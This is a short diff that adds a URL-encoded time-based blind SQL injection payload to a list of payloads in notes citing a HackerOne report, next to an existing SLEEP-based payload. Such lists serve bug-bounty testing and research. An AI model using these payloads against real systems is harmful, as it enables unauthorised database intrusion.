@@ -9,3 +9,4 @@ https://hackerone.com/reports/1081145
 
 Some payloads:
 ' AND SLEEP(5) AND 'wRIg' LIKE 'wRIg
+ '%2b(select*from(select(sleep(20)))a)%2b'
